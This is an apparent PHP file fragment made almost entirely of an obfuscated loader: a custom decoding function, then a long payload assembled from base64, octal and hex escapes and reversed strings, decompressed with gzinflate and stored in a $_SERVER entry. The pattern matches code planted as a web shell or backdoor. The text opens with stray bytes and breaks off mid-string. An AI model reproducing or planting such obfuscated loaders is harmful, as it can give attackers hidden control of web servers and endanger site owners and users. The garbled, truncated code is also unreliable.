AÖ”·ìÂç¾: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\344\364\256\225\275\302", base64_decode('q4Pw2c+D')); $_SERVER[äô®•½Â] = explode("\x7c\x3\x7c\x3\x7c\x4", gzinflate(substr(base64_decode('H4sIAAAAAAAAE8W9CXgb1dUwzFI+CG/ZSguUUpgYEtuJFtvZnThBlmVbRLaMJGfBNpOxNLY=').base64_decode('JpY0smbkLQ4vpATKEsK+BMpSlkIpYS2EJYRSKGUpLS+lQFvghcROaEMp9CuFQst/l3OXGck=')."\341\375\237\357\173\236\57\220\350\336\163\227\271\313\271\347\236\173\356\71\347\156\174\350\215\367\136\277\154\374\100\364\337\327\176\360\366\107\27\74\376\51\15\217\357\77\176\0\372\227\204\117\272".base64_decode('6JD9yJ+jL7qwqqp1/qGz27+++aF7tJ9oP9YuiEZefCl82Ms/OS00eeuLo5P77/fv+1/cWY8=')."\62\323\262\365\364\107\311\231\266\242\217\30\226\155\121\100\322\314\365\31\375\64\154\344\350\257\237\376\164\306\42\5\75\153\332\72\215\372\350\217\12\355\42\377\132\203\31\203\245\253\355\321\204"."\32\357\354\350\10\305\22\220\251\136\116\317\232\51\10\345\265\202\226\205\357\347\365\202\205\132\43\127\247\346\315\274\236\163\100\4\40\245\331\132\257\146\101\115\115\215\152\123\250\43\22\135\255"."\46\126\167\204\40\107\257\72\130\324\13\243\64\106\202\161\133\53\330\11\43\253\363\34\303\5\336\256\306\120\113\270\135\111\304\2\355\361\100\60\21\216\266\123\160\60\332\326\26\116\224\302\143".base64_decode('0UikMRBcXprSEQu0tAUU1L6Mrhq5PrNKWUNT1ijVNNBs6JkUDeY01hx7NA+hBA+hacoVMxk=').base64_decode('GmnnoZTepxUzMFpNciRfMLIa6/RyfZRDaUAr2qaRS9JIaMQuaAKO2ppEE63noKp4KBIKJhQ=')."\334\100\245\71\26\155\123\140\22\262\232\145\353\5\145\145\153\50\26\122\160\243\33\52\111\137\53\25\300\227\166\64\24\112\40\22\121\246\252\301\326\263\171\126\15\55\123\246\262\150\254\51\24"."\123\32\127\53\142\204\222\146\66\153\346\174\250\26\64\223\266\324\324\120\54\106\3\36\100\357\110\30\117\32\104\242\315\315\361\20\217\101\347\116\217\240\226\314\1\374\164\304\122\175\31\133\35"."\322\62\105\206\246\3\364\267\22\176\340\327\264\0\165\7\215\234\121\4\64\205\52\114\223\57\53\10\24\131\156\235\101\364\24\4\262\250\274\11\345\172\1\326\313\162\255\145\1\3\255\320\41".base64_decode('GmxYSn8XQ/leFafpBVvVc0kzZeRgHS8DfNTsdFPBQBlovM/MpFjYMsagl31GRm8vZuUsPJo=').base64_decode('TBuZVIEtvX3lpNEIX8k4r4jlUUvGGREw+kbFUsT5OniqZRYLST2Mlg6N1wJYt23UOTYgZmc=')."\x3e\x63\x6a\xa9\xb8\x5e\xe0\x5d\x33\xcc\x66\x54\x51\xb4\x68\xcb\xc0\x22\xc9\xd6\x6c\x16\xb2\x4d\x88\x68\xc8\xb0\x36\xb4\x6c\xc\x1\x1c\x60\xcb\x25\x25\x8d\x96\xbf\xaa\xeb\x1c\xef\xbf\x7b\xba\x4e\x45\xff\x54\x3"."\105\354\206\366\244\365\114\106\325\107\164\130\117\331\324\74\213\15\204\337\352\65\162\176\4\241\321\160\124\115\153\126\272\55\65\117\45\245\240\271\271\224\76\342\313\247\363\64\52\126\172\267\3".base64_decode('3/GwtZt2SCLXGTOpZeSu0HDatvNxPZfCowBdMYdzZJTyug6ZmjxKSmlTViut9Ua9xQpmMzw=')."\304\172\307\141\26\7\332\43\154\52\123\175\200\251\154\267\250\200\17\32\26\41\174\142\325\152\371\174\306\110\152\266\141\346\374\146\322\326\155\257\145\27\164\15\152\14\44\223\272\145\171\203\146"."\316\56\230\31\157\40\223\61\207\275\321\202\321\157\344\352\225\131\64\17\116\104\153\335\213\351\142\75\54\340\212\305\12\106\32\374\231\131\15\105\273\317\273\220\55\114\236\273\240\345\254\76\275"."\xe0\xd\xc1\xaa\xa8\x57\x50\x63\x39\x71\x64\xd9\x9a\xc\x2b\x6f\x5a\x6\x6e\x5e\xbd\xa2\xd9\xb6\x96\x4c\x63\xc2\x22\xaa\x6f\xd8\x47\x7e\x23\x97\x31\x72\x7a\x69\x5e\x54\x89\xee\xed\x28\x68\xfd\x59\xad\x5e\xc9\x17"."\x7b\xd1\x0\xc0\x62\x4\x58\x12\xe7\x90\x33\xc3\x0\xd4\x2b\x59\x6d\xc4\xab\xf5\xb3\x9a\x42\x23\x79\xa3\xa0\x5b\xac\xd7\x4a\x4b\x5b\x2\x30\xaa\xcf\xdb\x86\x17\x91\xa1\xa7\xbc\x71\x44\xb9\xa1\xb2\x39\x35\x73\x15"."\x84\x2b\xa\x4b\xa3\xd0\xd6\x44\xa2\x43\xd\x37\xa3\xad\xb9\x3d\xa4\xb6\x5\x12\xc1\x56\xa8\xdd\xd6\xfa\x59\xd5\x11\x44\x8f\x79\x95\xc\xb8\xca\x8b\x16\x13\xc6\xa6\x76\xd4\x39\x1\xec\x30\x87\xf5\x2\xfa\x70\xe3"."\150\275\62\140\246\172\315\21\37\113\302\231\343\210\252\260\314\170\176\363\266\67\246\345\372\161\67\172\107\155\35\160\116\320\245\106\264\221\373\372\350\312\365\365\352\175\146\1\172\143\15\365\73".base64_decode('Bz+i5/rtNKs7HoqtCMXUeLQ5sTIQg30/hzBnhLUGfz3jjekpNIhJm5XT8mL0V3nxgsEfZ6k=')."\x78\x11\xb1\xb4\x48\xb8\x5\x8f\x5d\x93\xd7\x42\x99\xbc\x72\x2e\x56\x77\xc4\xc8\x1a\xb8\x7b\x36\x4f\x21\x83\x8d\x98\x82\x16\x68\x90\x9f\xf4\xb9\xa1\xdb\x9a\x55\xd5\x9d\x9a\x5d\xed\x45\xff\xce\xaa\xee\xea\x6e\xf2"."\315\352\131\346\67\104\31\177\255\257\126\251\253\231\257\164\40\56\305\320\62\12\164\272\44\107\215\22\135\356\34\26\201\341\71\63\247\227\135\130\10\221\114\113\367\266\352\32\42\320\150\42\34"."\363\342\141\337\242\361\175\214\56\336\47\45\132\342\232\27\12\214\205\116\357\14\305\23\152\133\50\321\32\155\202\346\207\2\20\312\241\302\244\275\154\216\61\123\106\203\150\214\41\60\42\355\37"."\x62\x1f\x48\xca\x3\x42\xca\xb5\x9b\xc3\xe3\x40\xf9\x5d\x8\x14\x4c\xeb\xc9\x81\x29\xd2\x50\x8\x7a\x63\x52\xba\xc4\xa6\xae\x8b\xfe\xf4\x0\x36\xf7\xd0\x1f\x55\xd\x46\x42\x81\x98\xa\xdc\xac\x6a\x58\xcd\xd2\x16".base64_decode('iqOc3Kpm71qEaG0621Pgw+EsWtKiI6pzv2O9bBOIj1bQSiPFN0QUbdWN/jS028DVJc2MWdA=')."\x32\x78\x2b\x60\x3c\x6c\xbf\x1\x54\x39\x9f\x29\xa2\x65\xe0\xc7\x15\x27\xd2\xc5\x6c\x2f\x6c\x5c\x68\xc8\xfa\x75\x5b\xb0\x97\xd6\x28\xe2\xc1\x80\x10\x23\x6e\x1c\x8d\x6d\x18\x66\x9\xb6\x60\x88\xf9\x55\x8c\xba\xdd"."\276\174\256\277\372\24\250\113\255\233\127\203\1\60\253\320\63\304\147\27\365\322\256\373\222\46\132\347\155\332\200\136\217\373\2\304\155\61\201\262\210\104\77\27\343\55\257\301\115\46\360\154\145".base64_decode('fFlUCakzaPJNmp5kgB9iW56iFwpmYTrkIGGF7Jt4uqBym3MgFqIILJw2OcdiMtys90O/Z9Q=').strrev('¤Û#,Gˆ„ÅGljÌÊ@<şƒŸÀ¶I-¡œ`¨QªTµPhÙgÍÎ!I5')."\236\242\373\244\3\104\27\70\5\315\142\237\54\330\46\116\54\70\162\42\44\115\233\320\150\204\25\320\341\42\357\71\33\203\224\236\321\31\202\245\165\306\152\324\100\66\64\63\34\375\372\370\72"."\100\7\11\4\25\374\235\141\305\120\111\314\30\260\370\112\174\362\22\0\314\35\1\136\211\140\6\315\152\224\54\50\21\357\50\350\175\6\320\367\34\242\23\155\132\141\200\165\14\225\24\113\21"."\x47\xa4\x65\xda\xdc\x19\x89\xa8\xc1\x68\x7b\x2\x1d\xdc\x28\x64\x65\x2c\x9c\x0\xaa\x16\x43\xd4\x49\xd\x4\x3b\x20\x26\x68\x20\x67\xe0\x64\x16\x84\x42\x86\xea\x0\x85\x50\x23\xfc\x82\x57\x42\x9b\x75\xde\xcc\x21"."\112\13\304\312\53\216\165\45\111\51\301\112\0\356\10\366\303\305\121\40\236\40\73\346\315\42\272\342\345\155\352\350\4\136\200\141\5\143\211\33\107\61\267\13\223\157\364\347\126\360\231\137\31"."\237\353\155\155\13\4\275\361\326\100\335\274\371\24\272\72\233\352\116\264\32\126\367\31\74\16\315\31\266\346\252\5\35\255\151\206\13\165\65\265\154\305\41\276\104\23\55\137\355\315\172\161\55"."\x98\xa5\xf4\xd5\xd4\xd4\xb0\xba\x66\xcf\x57\xd2\x88\x94\x8c\x33\xfa\x9d\x22\xbd\x5\xe\xa0\xb7\x98\x1c\xd0\x65\x72\x6e\x79\x87\xd\x46\xf3\x4e\xe1\xec\xf8\x29\xa5\x83\x6f\x15\xc9\xee\xa6\x6a\x49\x5c\x9d\x8a\xa"."\xdb\x45\x4b\x1e\x29\x84\x80\x29\x54\xc4\x60\x5c\x32\x85\x6a\x99\x7e\x13\xe1\x5d\x3a\x2b\x3\x53\x1c\x7f\x69\x5c\xa7\x2c\x17\x7c\x28\xad\xf1\x71\xc2\xa3\xc7\x16\x7\x62\xe8\x46\xe5\x42\x78\x98\x51\x1b\x18\xfd\x76"."\xf2\xd8\x4a\xa2\xfc\x40\x53\xd6\x3d\xc\xa3\x2d\xda\x91\xc7\x3b\x1b\xa2\xda\x6c\xda\x66\xd2\x9f\x43\xa1\x19\x45\xb4\x6e\xb\xc6\x98\x34\xfa\xcb\x58\x4d\x8c\x66\x46\xe3\xf0\xc9\x91\x6c\x46\x9c\xbf\x60\x68\x60\x34"."\xe5\xae\x8d\xa8\x28\x45\x85\x14\x55\x4e\x69\xe5\x74\x80\xcd\x42\x5b\x93\x6b\x4d\xd0\xcd\x9f\xc2\x96\x2c\x43\x5f\x54\x86\xb0\x34\xc7\xcc\x35\x54\xd6\xfa\x6a\x2a\x15\x76\x2a\x6d\xa8\xec\x4c\x34\x23\x3e\x7d\xd9\xd2"."\103\227\4\315\154\36\223\25\162\4\303\375\245\230\273\24\372\270\4\363\100\54\322\341\32\216\120\102\203\135\147\211\137\316\267\304\77\125\255\320\25\314\230\255\122\73\42\201\104\163\64\326\6"."\x38\x9e\xcf\xb\xb4\xca\x27\xcb\xad\x36\xaf\xa0\x48\x45\xcb\xab\x63\x3e\x19\x56\x81\x96\xcc\xb8\x50\x54\x1e\x8b\x55\x65\x31\x71\x55\x39\x4c\x5c\xe5\xc2\xc4\x55\xa5\x98\xb8\xaa\x1c\x9e\xd\x1\x42\x6a\x59\x6d\xcc".strrev('ªĞöwa"Vèâ\'h­F7†Pd`ÑÙŞ¢\\üGnˆ¡M¢ÛW/·'."\r".'h‘h	/¬Ú6Šõ¡Ì')."\x70\x3c\x11\x2f\x9b\x84\x60\x9d\x21\x57\x8a\xaa\xf5\xc1\x9\x21\x9c\x73\x43\xc6\xf9\x2e\xa2\xa2\xd\x89\xa1\x23\xf4\xbf\x31\x10\xf\x7\xd5\x8e\x0\x6b\x16\x9a\x38\xbf\x95\x1a\xb0\xfc\x5a\x21\x99\x46\xec\x41\xc4".base64_decode('6PXjMzeWDPr4qRTGJ4m5QVXrRds5Y12L+Og2IDcBlm6j2hELNYdX8WhzOBRpiqvBQLA1xIE=').base64_decode('7YE21qM+LM2z/M78KuKd41wmqMKKYJ+TxXAqEzCpYqtA5zAd8AXmA0tVyVADF5o0i5wTZkI=')."\207\54\353\65\72\103\302\40\261\3\124\25\375\251\126\2\161\305\316\103\35\150\220\173\107\171\220\164\203\305\21\233\4\337\127\200\217\57\151\201\212\363\64\112\247\265\362\200\100\237\315\131\145"."\127\34\15\272\110\103\50\22\40\342\133\204\252\4\145\340\63\6\332\61\13\166\200\65\247\117\210\116\325\150\107\50\26\300\202\127\165\145\54\332\336\2\5\206\323\72\153\100\30\206\277\212\35"."\x9f\x41\xfe\x6a\xb\xc6\x43\xcb\x18\x1a\x60\x58\x56\xc\xfa\x5a\x93\xd\x25\xc2\x24\x76\x28\xc9\xb1\x71\xee\xc5\x5c\x17\x63\xc5\x59\xa0\xf\x51\x1a\xc6\x31\x99\x45\x5e\x7f\xaf\x69\x42\x9d\x19\x7c\x52\x84\xea\x2d"."\x86\xa\x23\x8c\x6f\x98\x3d\xce\xf6\x55\x58\x41\xd1\xe5\xa1\x76\x95\xe1\xf\x8d\x49\x38\x47\x1\xa1\x58\x2c\x1a\x83\x6e\xdb\xe6\x0\x93\xd0\xd1\xc4\x58\x28\x1e\x82\x5\x8f\xf7\x70\x83\xd\x8a\xdf\x37\x1b\x70\x55".strrev('wšc¼wÕ–«ûwöï®«-eZ{1¥àX ÙDsíÖ!F•:ÏT'."\n".'_lï.ªìğ÷fŞ|&¼G')."\254\306\273\310\333\203\16\16\325\263\1\320\263\256\316\63\167\75\316\200\62\56\73\271\7\375\64\164\57\233\321\355\235\171\326\232\123\273\272\173\52\353\147\117\357\366\235\334\75\334\63\253\172".base64_decode('GftOslhAZxO24aKmpmZXoSahwzTPkpP2B5KBJYwZeQFdN389g6N50/tFiS5v9+yeZVI5CeQ=')."\376\26\42\361\210\23\115\363\174\1\357\31\270\147\274\50\136\335\200\23\305\134\122\354\322\30\373\173\65\176\52\355\317\211\343\236\135\340\122\333\41\204\221\142\43\130\67\203\376\256\147\23\331"."\257\303\322\46\67\66\214\313\53\346\214\101\166\356\312\351\203\20\60\155\216\305\272\75\254\63\364\100\160\107\34\41\7\333\234\120\222\24\313\110\233\31\21\261\161\34\345\310\144\344\125\174\4"."\x1d\xe6\x31\xb4\xd7\xc1\x3c\x4d\x83\xdc\x56\x52\xcb\xeb\x71\xa9\x87\xaa\x9a\x8\x34\x46\x42\xfc\x3c\xd\xf4\x96\xc5\x9\xed\x6b\xe4\x77\x3b\xa8\x6b\x82\x6e\x32\x2a\x20\x89\xcf\x88\x38\xb\xd6\xb7\x35\x98\x51\xc8".strrev('Š±:C1yM ‡Lt,]WòÃ<~y<ªr‡!ĞªXiR¶ «cG §øóeÍrz¿g§ò')."\xbf\xaa\xbb\xbb\xd8\xa5\xa7\x7a\xba\x10\xe2\x6b\xde\xbe\x9e\x75\x73\xd6\x57\x33\x19\x8f\xbf\x1b\xfd\x61\x91\x40\x99\xb\x17\x55\xb3\xd9\x90\x70\xea\xa7\xb6\x84\x12\x3e\xdc\x22\x2e\x62\x77\x44\x78\x32\x8d\x9a\x5".strrev('Š¢R<9ãíºâ%Á4º]Frğ;gÈEgtœÂ½G¼éœ"æi	Gki¶;ÉŞ~')."\xe2\x8e\xfb\xc3\x6\x10\x1e\xf7\x19\x39\xb4\xb0\x82\xd2\xd6\x46\x45\xfe\x71\x22\xa7\x70\x5c\x74\x59\x3a\xde\xf7\x9b\x8b\x99\x8c\xcd\xa5\x45\x19\x63\x0\xbe\x0\xab\x6\xee\xdd\xbc\xf4\x47\x99\x5d\xae\x28\x3a\x2a"."\x31\xe1\xe9\x2c\x68\x46\xc5\xac\x72\x19\xc3\xb9\x9c\x99\xea\x95\x91\x4e\x6c\xaa\x2d\x1\xc4\x5f\x25\x94\x2a\x76\x47\xa4\x84\xdb\x95\xc6\x68\x34\x12\xa\xb4\x2b\x78\xff\x86\x7d\x7\x31\x7\xf1\x50\x47\x0\x6d\x5a"."\130\14\33\117\204\340\332\52\334\344\145\365\256\362\62\241\13\17\30\60\354\146\236\36\166\20\153\224\61\31\31\161\212\155\360\211\321\203\205\47\36\314\113\170\120\253\75\130\336\342\21\347\161"."\217\270\172\361\14\31\372\60\11\360\263\262\7\216\320\36\41\51\202\140\270\311\143\130\115\104\24\100\76\100\222\130\23\354\64\226\212\147\264\121\17\155\116\104\37\322\63\36\46\103\362\260\66".base64_decode('epjkzEMkXk3QrE60sKBZJIjoZ9qDEQjjr0dcBnnM4ZxeIFlgYIQUwSMkDJ7+glnMd7BvSjE=')."\xda\x2c\x0\x88\x36\x73\x40\xcc\x34\x6d\xf\x13\xc6\x79\x64\xa9\x1c\xb4\x22\xc0\xd6\x49\xd9\xe1\x2c\xdf\x1b\x32\xfe\xee\x46\x0\x7e\xe1\xa4\xd2\x51\xfa\x8a\xc9\x2a\x9d\xf\xa7\x40\x72\x1d\xad\x11\x84\xb1\xeb\xd9"."\x7e\xe7\xc8\x43\x4\x83\x9c\xdb\xc4\x3\x2e\x42\x2b\xc4\x42\xc5\x1d\x68\xd6\xe0\xda\x91\x56\x2b\x87\x39\x82\xe6\x9c\x88\x2a\xee\x7e\xc4\x8d\x9f\xe0\x6d\xdd\xb2\x21\xf7\x5d\x20\xfe\x28\x3a\xe1\xc5\xa5\xcf\xd9\x5a".base64_decode('P/sWJlb8/FcmKw3H9ORoUgibmiQRljPW4OyPhyygcshffnI5QvO5OHTaNDa4DMv5xDoWx1c=')."\57\113\350\20\241\175\321\274\340\43\150\143\61\375\215\243\175\255\71\303\106\243\116\116\6\312\353\161\306\360\252\362\21\112\114\256\325\343\134\274\31\11\65\47\224\323\242\210\154\31\246\112\313"."\250\70\263\102\376\61\163\212\243\156\66\134\112\3\111\27\161\55\227\242\220\65\210\304\257\151\250\140\37\251\160\24\27\370\341\154\204\207\105\35\137\23\123\55\17\2\306\3\322\175\261\55\61"."\x50\x54\xec\x82\x45\x60\xfe\x34\x2b\x49\x3\x58\x38\xc\x21\x9d\xc1\xc4\xd4\xca\x8\x29\xd1\x19\x1\x60\xed\x72\x7c\x17\x47\xc5\x62\x62\x28\xa1\xe0\xf\x40\x5\x84\x5d\xc1\xb4\xc4\x2b\x96\x85\x14\x75\xe\xb9\xb"."\43\135\173\47\36\242\16\43\67\152\344\342\6\26\166\270\241\260\276\111\23\72\64\313\32\106\74\1\205\51\263\146\315\202\201\145\304\125\54\172\21\243\110\73\125\230\156\56\130\40\102\77\357"."\201\153\155\17\76\114\113\33\267\220\303\242\316\221\23\175\326\161\47\122\332\61\250\110\312\42\6\10\326\71\54\210\264\126\20\143\315\250\23\46\21\274\17\26\316\42\242\122\266\76\155\110\60"."\x2e\x8e\x32\x12\x8d\xb1\xec\x51\xd6\x7a\x39\xe8\xac\x94\x46\x9b\x3c\xe4\xb7\x15\x35\x5e\x5e\xcd\x7c\xf6\x8a\xa8\xe5\x2c\x13\x25\x4d\x88\x54\x44\xd0\x58\xa1\x1f\xd2\x91\x84\xe9\xc1\x97\x10\xe8\x87\x6e\xef\x16\x6b".base64_decode('coRLJzzocNMElxo4vALRB8ArPOBVjL4Ak6FKogFOn5xsAm1JgJN9xNFn0C5X8OEl1IL3KjY=')."\46\224\372\311\50\31\327\121\77\241\172\121\103\274\44\115\316\55\104\220\170\33\20\333\6\277\330\343\53\120\214\257\130\156\375\242\101\170\70\325\322\166\140\14\56\37\157\56\230\234\351\345\73"."\276\73\123\220\234\57\271\222\212\153\227\226\306\303\301\131\224\200\244\62\156\36\303\5\165\105\61\337\341\132\365\222\372\4\271\117\52\320\15\315\207\116\13\240\153\344\251\221\330\57\101\176\326".base64_decode('0Ts92ADXu+bXNk10BC34CuiLoiES6QPCQHRO4lqfLjMNjsRAPi+azeu3UBGJvDu5JlZnPK8=').strrev('w^ö(È—…Ù5RğC¥	e1—ç„Ò¶ñ.‹^ÒÙ\\'."\n".'È¥Éá|³“/>Z'."\r".'Wx®ª1')."\141\21\227\67\3\262\247\225\240\215\70\214\170\146\70\162\72\31\20\0\316\42\314\202\117\360\113\345\265\264\222\146\36\160\111\322\134\314\232\103\272\4\304\167\217\171\221\42\105\151\262\224\44".base64_decode('KpVy8akgLUIrM0W4bDEKJC+UJYd1uvh9+FDiE6McbgoUCgz1aTfxvTgCyiBMOeNs3ZbbCGk=')."\xe5\xa1\x21\xa1\x97\x48\xab\xc2\x1f\xf6\x51\xc2\x81\x2f\x5f\xa3\x39\xbe\x5e\x44\xb8\x34\xab\x2c\x9e\x2c\x5f\x51\x5c\xe8\x23\x38\x63\xe5\xb3\x7\x32\x19\xa1\x41\xe6\x8e\x4f\x59\x84\x12\xc\xb9\x90\xc\x99\xb2\x58"."\x33\x39\x1f\x33\x9\x76\x39\x18\x3f\x19\x4d\xcd\xed\xbb\x95\x0\x9c\x44\x7e\x6a\x66\x88\x2d\x62\xf7\x21\x86\x4f\x63\xf9\x38\xda\xd7\x83\x69\x23\xa7\x33\x79\x4e\x9f\x51\xb0\xca\x51\xbb\xff\xc7\x5c\x77\xe9\xc8\xe3"."\x15\x32\x15\xba\xe0\x34\x49\x90\x8d\xf5\xa3\x87\x74\xf9\x18\xc2\xe5\xb8\x82\x54\xf1\xd\x7f\xdc\xcd\xc6\x0\x2b\x21\x45\x54\xdb\xc1\x8d\xc5\x48\xfd\xd2\x72\x72\x60\x8\x5a\xbe\x74\x3c\xf0\x66\x17\x8e\xfa\xac\x29"."\x70\xd6\x9d\x8f\xab\xdb\x10\x9a\x38\xc2\xf7\x68\xb9\x10\x4e\xc2\x73\x29\x57\x2a\xb8\xbf\x7d\xe4\xe7\x95\xb\x4e\x50\xce\x87\x70\x17\x27\x4c\xd5\x56\x96\xcc\x6b\xb9\xe9\xd3\x9f\xbd\x72\xd7\xaf\x69\xf8\xa7\x3f\xdc".strrev('Ÿ¦‘|;™è{/ªÛ¼æù7†ğyı*;wæqã~WY@èH¿è?¡ÏXÁcA•8i—œó¶').base64_decode('/sNP60/7+NaPtNFHWm58dHjdH/9wdPg19eKHL/jb9NCFj53a81B60zHpc+YPnf2/pm25+cs=').strrev('Üš^fcìø»œÿ~Åw¿oß¸GáÒq]Ÿ³á©8¯{Gç=½'."\r".''."\r".'÷'."\r".'6Cªí¾?©©vÆ;').base64_decode('+/xT77z0rY+fPSw9eMhfnzjzvz/efv6GW37w+9nf/PIP4SP39i6ZXHza3neP/MZZrQ3XHHQ=')."\xcc\x55\x87\x1c\xd9\x11\x39\x65\xf1\xf3\xbb\xee\x7b\xfd\x94\xdf\xfc\xec\x9b\xbf\x68\x39\xe1\xce\xd9\xdb\xcf\xf8\xc7\x7d\x77\xfc\xfd\xef\x3f\x3f\xf3\x7b\x7\xe6\xde\xdc\x3a\xad\x7f\xb5\xb9\xeb\xad\x6f\x9c\x7d\xfe".base64_decode('o5FpqfYXrzt42Y7bd+yY+bPxRemVnzX/+W8/7b5gwaahiz4c3vLBB4V4dMMBJ12+94LDfrQ=').base64_decode('eu/p33n8rNNmH/v71Pb9pp+w6+NpY+del33oqZqbP7T+msrd0vvyqpOuvV4xXvOoWx6O/nk=').strrev('óîú?MÖ%ãf?Ûãò½é,G²këş/§W{å:,çÁí}»ŞßÖø^oü~q_—Oì~').strrev('øj{“œÏ'."\r".'ÔÿŸfz«ş¿šôÇZôû¾«Múın«ï+qÍşh¯HÄïçuüÏşÆkë?N/')."\xea\xb6\xf1\xdf\x1f\xb9\xb9\x6d\xff\xc6\x13\x8f\x7b\x7a\xe6\x8a\xa3\x2a\x2\x7b\x9f\xad\x7d\xf6\xcc\xba\xf9\xdf\x69\xfe\xd3\xaa\xcb\x8e\xd9\xf9\x5c\xcf\x9f\x14\xed\x1b\xb\x53\xcd\xef\xad\xdb\xb3\xdf\x77\xfe\xbe"."\373\306\113\17\274\366\222\17\76\151\351\130\273\40\165\331\316\277\327\334\161\377\323\127\236\372\306\47\67\317\175\356\220\43\337\170\356\340\373\56\76\362\306\117\276\355\33\274\377\210\363\216\132".strrev('}ñìÈn÷2#Úî:~‚îr‚r1cØ/iR8:;Üî×àşİÖ×¯±İbpİöî‡ñå­¶µ')."\xef\xfa\x87\x93\xcb\xab\xf6\xff\xf9\x8f\x9f\xf2\x4\x8f\xfb\xa0\xae\x66\xf0\xfa\xc7\x1f\x3d\x78\xd3\xa3\xe7\x5c\xfe\xa7\xca\x9f\x7d\xeb\x6b\xfb\x5f\xd6\xf7\xb3\xf8\x31\x1b\xef\x33\x1e\xdf\x39\x77\xd7\x53\x9e\x99"."\236\143\337\73\172\146\254\146\306\45\33\354\246\227\232\176\73\357\271\133\377\266\340\376\67\247\135\364\352\365\107\316\213\277\171\316\301\207\77\70\370\332\47\77\333\357\366\367\26\332\326\11\207".strrev('Uót;n·]ñwí·»[’ñº_«Ñ`:Ì·“¾ùàÖÜà¾¥Ê7ö¸G	ıs:Ï×ö>Î‹ğ')."\227\155\172\151\243\262\376\350\356\277\235\275\377\321\227\164\357\67\377\335\151\115\203\343\153\237\332\160\324\3\223\277\270\243\366\276\201\67\203\323\217\273\355\267\103\347\157\371\345\330\177\174\255".base64_decode('akbdOxcdcM1j7734uzUtR731XPLbTbW/7Lyvyv/Z/FnnXHXu16/dqPov+/lF/UfWPzHnad8=').strrev('×àºk­ïñ<Y_ÓıööóÙöü—oö¡şÿ÷C›z+îê¶Ô]ÇàÌô[áOí?ìŞßø')."\x9e\x98\x15\x8d\xed\x5e\xf8\xdb\x17\xaa\x3f\xf5\xfd\xb5\x65\xf9\xd9\xb\x2f\xbd\xb6\x71\x7c\x4e\xcc\x7e\x6a\x6e\xe7\x6b\x6b\xec\xca\x87\xf7\xff\xfc\xe1\x1f\xbf\x72\xc2\xcd\xf1\xff\xf5\xca\x5d\x87\x4c\x16\xfe\x7e"."\xf3\x2b\xff\xf5\xe2\xaf\xfa\x3e\x5f\x65\x3e\xb4\x68\xef\xb6\x87\xef\xf9\xc7\xef\x3f\xf8\x77\xef\xcf\x1b\x9f\xfa\xee\x99\xaf\x3c\xd3\xf4\xda\xe1\xb7\xb5\xfe\xb9\xb6\xa7\xe2\x4f\x4f\x9f\x7c\x85\x3a\x37\x75\x7b\xeb"."\x21\xbf\xeb\xe9\x3c\xe3\xc0\x8d\x87\xcc\xf8\x60\xe7\x95\xd3\xfe\xeb\xbf\xac\x3\x36\xcd\x9e\x79\xf4\xe2\x3f\x2e\xe8\x5e\x7e\xe9\x17\x8d\x55\xfe\x27\xae\xa\xc7\xc\xef\xc4\x3\xfb\xdf\xf8\x7c\xcd\xf0\x9\x7b\xfb"."\16\333\373\253\67\367\326\376\160\365\63\207\364\54\173\357\270\177\74\362\213\177\136\375\223\365\165\357\136\343\333\162\341\330\264\147\13\27\34\260\363\307\27\235\170\143\343\3\15\73\16\130\374".strrev('çÙCõn¹¸—GÛ{¡9nÖLoµµéşw[ùô<fáğ\'>S[±÷cƒé[çzï_áô')."\60\357\74\75\360\151\375\45\227\36\131\74\354\33\33\236\357\332\60\272\346\372\7\62\43\367\373\366\376\146\227\377\320\346\77\277\171\330\306\105\357\165\177\66\272\243\347\265\315\153\33\332\176".strrev('È_;ªúx°ü/f;»…[ÕsØ_«ïı½n¤g[ÍkhŒı°6¿wÛÉuÿÏ¡ùKŒí¥')."\234\173\330\331\207\77\165\334\217\277\277\356\77\126\15\337\273\173\301\327\317\75\360\226\27\176\177\353\365\237\317\274\163\313\346\226\235\207\254\256\122\136\231\277\262\367\243\17\17\71\253\273\155"."\351\117\267\236\373\341\37\337\75\260\155\316\170\372\331\223\376\343\261\157\315\367\236\275\170\332\267\353\127\35\323\72\347\327\47\276\160\354\117\276\263\340\263\317\376\122\374\371\113\346\67\57\274"."\x7b\xf6\xc0\x82\x15\xb9\x67\xe6\x1d\x78\xf9\xac\x9d\xb7\xf4\x1d\x71\xff\xe2\x2f\x7f\xf5\xe0\xdf\x96\x7d\xf9\xf1\xc7\xaf\xbd\xe3\x57\x97\x6d\xff\xf4\xcf\xaf\x9a\x37\xee\xd8\x36\xfe\xaf\x7f\xbe\xf5\xe2\xeb\xea\x8d"._kodDe('Lq/L7WhzvR/t6x8Px22O1WHvobXp91vQ7N+fT/Tk7idP7g1ru4peseGOf6Grnt0fW2hMOcSb').base64_decode('j40ds3vnGccd9/4s7dwHf5RJFw74etf1h5y0YevcnfvtnzzhvLdPe+a24/9gvlucf/Wmmvs=')."\243\332\332\232\225\337\360\64\133\365\65\7\175\353\264\3\36\75\350\360\43\364\317\73\146\104\103\257\364\274\272\145\311\113\117\74\370\300\47\351\17\46\177\174\346\13\27\74\160\275\77\263\344"."\214\325\135\157\275\163\367\300\153\227\353\113\333\37\71\366\255\341\361\365\247\274\172\171\113\170\350\376\357\374\42\34\255\155\76\153\106\354\252\3\157\133\166\371\201\247\246\216\77\152\327\165\27"."\xff\xa6\xe2\x8a\xcb\x7a\xbe\xbf\xe9\xd7\x6f\xee\x3f\x27\xa9\x8c\x5d\x76\xe4\x37\xcf\xc9\xd7\x69\xb\x76\xde\xf1\x8c\x71\xeb\xe0\x29\x2f\x3e\xf6\xfa\xf5\x6f\x5d\x7c\xd7\x31\x23\x27\xce\x9c\x7b\xcf\xb1\x17\xff\xeb".strrev('÷uíOk¼¿wKÿNmLï|eÿzh;˜×»½¬ïïf}Ş;²?ÂpİV´f›OÖğı÷Ûæş7å')."\354\176\250\257\346\332\343\167\235\371\350\47\67\57\175\143\266\376\337\173\377\367\252\377\170\354\252\277\170\166\274\365\366\342\267\74\13\277\367\374\212\35\157\156\265\377\274\50\326\162\376\242\261".strrev('Kuëz